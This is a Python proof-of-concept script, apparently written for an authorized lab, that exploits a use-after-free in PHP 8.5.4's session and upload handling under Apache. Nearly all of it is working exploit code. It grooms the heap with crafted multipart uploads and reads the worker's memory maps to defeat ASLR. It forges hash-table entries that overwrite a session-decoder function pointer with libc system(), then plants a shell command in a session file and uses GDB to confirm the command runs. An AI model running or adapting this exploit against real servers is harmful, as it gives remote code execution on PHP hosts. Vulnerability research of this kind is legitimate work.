#!/usr/bin/env python3
"""Single-file Apache/mod_php PoC for the authorized phpasan-x64 lab.

Combines OOM priming, heap grooming, session polyglot creation, the final
multipart request, GDB proof, and validation. It expects the pristine Apache
build and dedicated one-worker service already installed under /opt/php-uaf-lab.
"""
import argparse, os, re, shutil, socket, struct, subprocess, sys, tarfile, tempfile, time
from pathlib import Path

ROOT=Path('/opt/php-uaf-lab')
MODULE=ROOT/'build/php-8.5.4-apache-clean/libs/libphp.so'
LIBC=Path('/usr/lib/x86_64-linux-gnu/libc.so.6')
SESS=ROOT/'sessions/apache-clean'
RESULTS=ROOT/'results/bgctx'
WEB_INDEX=ROOT/'www-trace/index.php'
SERVICE='php-uaf-apache-trace'; HOST='127.0.0.1'; PORT=18085

def run(cmd, **kw):
    return subprocess.run(cmd, check=True, text=True, **kw)
def out(cmd):
    return subprocess.check_output(cmd, text=True).strip()
def children(pid):
    s=out(['pgrep','-P',str(pid)])
    return [int(x) for x in s.splitlines() if x]
def worker_pid():
    ctl=int(out(['systemctl','show','-p','MainPID','--value',SERVICE]))
    return children(children(ctl)[0])[0]
def wait_port():
    for _ in range(200):
        try: socket.create_connection((HOST,PORT),.1).close(); return
        except OSError: time.sleep(.03)
    raise RuntimeError('Apache did not open port')
def request(path, body, sid, boundary, timeout=20):
    h=(f'POST {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n'
       f'Cookie: PHPSESSID={sid}\r\nContent-Type: multipart/form-data; boundary={boundary.decode()}\r\n'
       f'Content-Length: {len(body)}\r\n\r\n').encode()
    s=socket.create_connection((HOST,PORT),3);s.sendall(h+body);s.settimeout(timeout);data=b''
    try:
        while True:
            b=s.recv(65536)
            if not b:break
            data+=b
    except OSError:pass
    s.close();return data
def part(boundary,name,value,filename=None):
    x=b'--'+boundary+b'\r\nContent-Disposition: form-data; name="'+name+b'"'
    if filename is not None:x+=b'; filename="'+filename+b'"'
    return x+b'\r\n\r\n'+value+b'\r\n'
def upload_body(filename):
    b=b'UPRIME';return part(b,b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(b,b'f',b'Z'*32,filename)+b'--'+b+b'--\r\n',b
def prime():
    for fn,sid in [(b'a','victim'),(b'B'*500000,'prime'),(b'A'*900000,'prime')]:
        body,b=upload_body(fn);request('/index.php',body,sid,b)
def maps(pid):
    rows=[]
    for line in Path(f'/proc/{pid}/maps').read_text().splitlines():
        p=line.split();a,b=(int(x,16) for x in p[0].split('-'));rows.append((a,b,p,line))
    return rows
def heap_base(pid):
    for a,b,p,_ in maps(pid):
        if p[1]=='rw-p' and len(p)==5:
            h=(a+0x1fffff)&~0x1fffff
            if h+0x200000<=b:return h
    raise RuntimeError('Zend heap mapping not found')
def image_base(pid,path):
    path=str(path)
    for a,b,p,line in maps(pid):
        if len(p)>=6 and p[2]=='00000000' and p[1].startswith('r--') and p[-1]==path:return a
    raise RuntimeError(f'image mapping not found: {path}')
def symbols(binary, wanted, dynamic=False):
    txt=out(['nm','-D' if dynamic else '-an',str(binary)])
    found={}
    for line in txt.splitlines():
        q=line.split()
        if len(q)>=3:
            for name in wanted:
                if q[2]==name:found[name]=int(q[0],16)
    missing=set(wanted)-set(found)
    if missing:raise RuntimeError(f'missing symbols {missing}')
    return found,txt
def read_mem(pid,address,size=48):
    with open(f'/proc/{pid}/mem','rb',buffering=0) as f:f.seek(address);return f.read(size)
def stale_ground_truth(pid):
    text=subprocess.check_output(['gdb','-q','-batch','-p',str(pid),'-ex','p/x basic_globals.unserialize.data','-ex','detach','-ex','quit'],stderr=subprocess.DEVNULL,text=True)
    m=re.search(r'\$1 = (0x[0-9a-f]+)',text);return int(m.group(1),16) if m else 0
def final_body(d,target):
    fake_entries=d-0x4fe8;fake_dtor=d-0x1fe8;delta=target-(fake_dtor+16)
    assert delta%16==0;used=delta//16
    vals=[]
    for i in range(120):
        v=bytearray(bytes([0x41+i%26])*8191)
        if i==110:v[:16]=b'\0'*16
        if i==111:
            v[:8]=struct.pack('<q',used);v[8168:8176]=struct.pack('<Q',fake_entries);v[8176:8184]=b'\0'*8;v[8184:8191]=struct.pack('<Q',fake_dtor)[:7]
        vals.append(bytes(v))
    b=b'APACHECF';body=b''.join(part(b,f't{i}'.encode(),v) for i,v in enumerate(vals))
    body+=part(b,b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(b,b'f',b'Z'*32,b'a')+b'--'+b+b'--\r\n'
    return body,b,used
def seed_session(system,command,run_no):
    if any(x in command for x in ['|','#','\n','\r']):raise ValueError('command may not contain |, #, or newlines')
    output=Path(f'/tmp/apache-single-poc-output-{run_no}');output.unlink(missing_ok=True)
    cmd=f'{{ {command.rstrip(" ;")}; }} >{output} 2>&1 #|i:{system};'.encode()
    path=SESS/'sess_victim';path.write_bytes(cmd);shutil.chown(path,user='www-data',group='www-data');os.chmod(path,0o600)
    return output,cmd
def start_gdb(pid,run_no):
    log=RESULTS/f'apache-single-file-gdb-{run_no}.txt'
    script=f'''set pagination off
set confirm off
break system
commands
 silent
 printf "APACHE_SINGLE_FILE_SYSTEM_HIT system=%p command=",$pc
 x/s $rdi
 bt 12
 detach
 quit
end
continue
'''
    tf=tempfile.NamedTemporaryFile('w',delete=False);tf.write(script);tf.close()
    fh=open(log,'w');p=subprocess.Popen(['gdb','-q','-batch','-p',str(pid),'-x',tf.name],stdout=fh,stderr=subprocess.STDOUT,text=True)
    time.sleep(.3);return p,fh,Path(tf.name),log
def pristine_check():
    files=['ext/standard/var.c','ext/standard/var_unserializer.c','Zend/zend_hash.c','ext/session/session.c','main/rfc1867.c','main/SAPI.c','main/php_variables.c']
    src=ROOT/'build/php-8.5.4-apache-clean';tar=ROOT/'src/php-8.5.4.tar.xz'
    with tarfile.open(tar) as t:
        for rel in files:
            if (src/rel).read_bytes()!=t.extractfile('php-8.5.4/'+rel).read():raise RuntimeError('modified source: '+rel)
    return len(files)
def preflight(module_nm):
    if os.geteuid()!=0:raise RuntimeError('run as root')
    for p in [MODULE,LIBC,SESS,WEB_INDEX]:
        if not p.exists():raise RuntimeError(f'missing {p}')
    if 'bg_hijack' in module_nm or 'bg_write_target' in module_nm:raise RuntimeError('lab sink/canary linked')
    if str(MODULE) not in Path('/etc/apache2/mods-enabled/phptrace.load').read_text():raise RuntimeError('clean module not loaded')
    if not re.search(r'MaxRequestWorkers\s+1',Path('/etc/apache2/mods-enabled/mpm_prefork.conf').read_text()):raise RuntimeError('Apache must use one worker')
    if WEB_INDEX.read_text().strip()!='<?php // Silence is golden.':raise RuntimeError('index.php is not the no-op endpoint')
def main():
    ap=argparse.ArgumentParser();ap.add_argument('--runs',type=int,default=3);ap.add_argument('--max-attempts',type=int,default=20);ap.add_argument('--command',default='id; uname -a');args=ap.parse_args()
    RESULTS.mkdir(parents=True,exist_ok=True);SESS.mkdir(parents=True,exist_ok=True)
    syms,module_nm=symbols(MODULE,['ps_serializers','ps_srlzr_decode_php']);lsyms,_=symbols(LIBC,['system@@GLIBC_2.2.5'],True)
    pristine=pristine_check();preflight(module_nm);records=[];attempt=0
    try:
        while len(records)<args.runs and attempt<args.max_attempts:
            attempt+=1;run_no=len(records)+1
            run(['systemctl','restart',SERVICE],stdout=subprocess.DEVNULL);wait_port();pid=worker_pid()
            for p in SESS.glob('*'):p.unlink()
            prime();heap=heap_base(pid);d=heap+0x1c6000;actual=stale_ground_truth(pid)
            mb=image_base(pid,MODULE);target=mb+syms['ps_serializers']+0x28;lb=image_base(pid,LIBC);system=lb+lsyms['system@@GLIBC_2.2.5']
            body,bound,used=final_body(d,target)
            if used>1017:
                print(f'ATTEMPT {attempt}: skip unsuitable ASLR layout used={used}',flush=True);continue
            before=read_mem(pid,target-16);output,session=seed_session(system,args.command,run_no)
            gdb,fh,tf,glog=start_gdb(pid,run_no)
            response=request('/index.php',body,'victim',bound);(RESULTS/f'apache-single-file-response-{run_no}.bin').write_bytes(response)
            try:gdb.wait(20)
            except subprocess.TimeoutExpired:gdb.terminate();gdb.wait(5)
            fh.close();tf.unlink(missing_ok=True)
            for _ in range(300):
                if output.exists():break
                time.sleep(.02)
            after=read_mem(pid,target-16);same=worker_pid()==pid;gtext=glog.read_text(errors='replace');cmdout=output.read_text(errors='replace') if output.exists() else ''
            ok=(actual==d and int.from_bytes(before[16:24],'little')==mb+syms['ps_srlzr_decode_php'] and int.from_bytes(after[16:24],'little')==system and same and b'HTTP/1.1 200 OK' in response and 'APACHE_SINGLE_FILE_SYSTEM_HIT' in gtext and '__libc_system' in gtext and 'php_session_decode' in gtext and bool(cmdout))
            print(f'RUN {run_no}: worker={pid} d=0x{d:x} target=0x{target:x} system=0x{system:x} used={used} PASS={ok}')
            print(cmdout,end='' if cmdout.endswith('\n') else '\n')
            if not ok:continue
            records.append(dict(run=run_no,attempt=attempt,pid=pid,module=mb,heap=heap,d=d,target=target,libc=lb,system=system,used=used,before=before.hex(),after=after.hex(),output=cmdout,gdb=str(glog)))
        if len(records)!=args.runs:raise RuntimeError(f'only {len(records)}/{args.runs} successful runs')
        report=RESULTS/'apache-single-file-repetitions.txt'
        with open(report,'w') as f:
            for r in records:
                f.write(' '.join(f'{k}={v if not isinstance(v,int) else hex(v)}' for k,v in r.items())+'\n')
        assert len({r['module'] for r in records})==len(records) and len({r['heap'] for r in records})==len(records) and len({r['libc'] for r in records})==len(records)
        summary=(f'VALIDATION=PASS sapi=apache2handler single_file=yes pristine_source_files={pristine} runs={len(records)} '
                 f'unique_module_heap_libc={len(records)} same_worker=yes sink_symbols=absent natural_target=ps_serializers[1].decode '
                 f'application_function_call=none attempts={attempt}')
        print(summary);(RESULTS/'apache-single-file-summary.txt').write_text(summary+'\n')
    finally:
        run(['systemctl','restart',SERVICE],stdout=subprocess.DEVNULL);wait_port()
if __name__=='__main__':main()
